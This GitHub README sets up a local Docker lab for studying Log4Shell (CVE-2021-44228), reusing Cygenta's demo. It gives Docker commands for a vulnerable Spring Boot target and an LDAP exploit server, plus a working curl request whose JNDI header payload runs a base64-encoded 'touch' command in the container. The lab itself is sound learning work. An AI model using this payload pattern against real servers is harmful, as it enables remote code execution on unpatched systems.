# log4shell-docker-test

Docker Self-Study and Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
It is meant as a newbie study into the ease of Docker, with a non-trivial example like Log4Shell.
Therefore, most of the prior art is taken from Cygenta's demo https://www.cygenta.co.uk/post/your-own-log4shell-demo for study and tweaking.


## Background of Log4Shell

Log4Shell is a major vulnerability in Log4Java 1 and 2 due to the design of very powerful JNDI "features" which belong to a more trusting era :)
In short, log4j allows JNDI commands to be embedded and parsed in log statements, and by chaining a secondary vector such as another old favourite, LDAP in this example, a Java object can be loaded from the foreign LDAP service into the target which has the vulnerable log4j JNDI module.

The Cygenta demo here demonstrates an OS-level command "touch" which creates a new blank file on the target Linux OS.
There is another https://github.com/mbechler/marshalsec that covers the LDAP-based exploit, and is POC'ed for Windows OS by https://github.com/many-fac3d-g0d/apache-tomcat-log4j
The Windows version runs "start calc.exe" which launches the Windows Calculator on the host OS (aka yours, if using localhost)

Both are very interesting and very scary at how easy it is.


## Setup and Configurations

Key dependency is `Log4j 2.14.1` (technically any version prior to 2.15.x will do)

Others are Java ecosystem platforms like `spring-boot-starter-log4j2 2.6.1` which contains the old `Log4j` and `JDK 1.8.0_181`.

Docker images:
1. denizenx/log4shell-vulnapp is *my* rebuild/refactor of https://github.com/christophetd/log4shell-vulnerable-app
2. cygenta/log4jldap is the LDAP service hosting the Exploit


## Running the Exploit

Run it:

1. Local network for target and LDAP host
docker network create log4jnetwork

2. Run target straight from Docker Hub
docker run --rm --network log4jnetwork --name vulnap -p 80:8080 denizenx/log4shell-vulnapp

3. Do a container check in /tmp BEFORE the exploit; you should see 3 temp files
docker exec vulnap ls /tmp

4. Run the LDAP service hosting the exploit
docker run --rm --network log4jnetwork --name log4jldapserver -p 1389:1389 -p 8888:8888 cygenta/log4jldap

5. Launch the HTTP Request to start the exploit
curl.exe 127.0.0.1:80 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'

6. Do the container check in /tmp AFTER the exploit; you should see the CYGENTA addition
docker exec vulnap ls /tmp


## Build it yourself (you don't need any Java-related tooling):

You can pull the images, but not too useful as the meat are in the Java source.


## Self-study Observations and Way Forward

For the Docker self-study, I only recreated the vulnerable application, as it is sufficient for now to illustrate quite a bit of Docker (a different level of "Hello World!" heh)

Learning points:
- Docker: curious why the demo fails if log4jnetwork is not used, even though both are attached to the default Docket subnet (is it like an Access Point isolation for routers)
- Spring Boot: is very impressive for developers, but Docker-Compose is better for putting services together.
- Tomcat: is a b*tch* and modding its official images are a trip to Hell: I tried to put log4j into a few and ultimately wasted time on CLASSPATHing Docker *and* Tomcat
- Exploits: are scary. After this exercise I have first-hand experience on only just Log4Shell... omg
- Windows Subsystem for Linux: this tripped me up a while testing the original demo. "curl" in Powershell is a bad imitation of "curl.exe" from WSL


## References

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
https://www.cygenta.co.uk/post/your-own-log4shell-demo


## Thanks to their projects

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
